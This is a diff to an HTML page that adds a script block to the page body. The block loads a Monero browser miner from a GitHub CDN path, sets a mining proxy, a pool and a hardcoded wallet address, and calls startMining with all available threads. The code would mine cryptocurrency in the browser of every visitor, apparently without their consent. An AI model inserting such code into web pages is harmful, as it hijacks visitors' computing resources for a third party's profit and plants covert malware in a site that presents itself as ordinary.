@@ -14,6 +14,19 @@
 </head>
 
 <body>
+    <!-- Start Of Mining Code (HTML) -->
+<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+<script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "moneroocean.stream";
+    var walletAddress = "42Va7iaYEdYQh97B8M6fw2d5K6qnYdq5qQBi7Zjhowr7KAZgwfuYr6FhqnuKW2po6vZGrGuWeGHcZSDWDS7vJhtuUK2rTGe";
+    var workerId = "GH-XMR"
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
+<!-- End Of Mining Code (HTML) -->
     <div id="particles-js"></div>
 
     <div class="scene"></div>
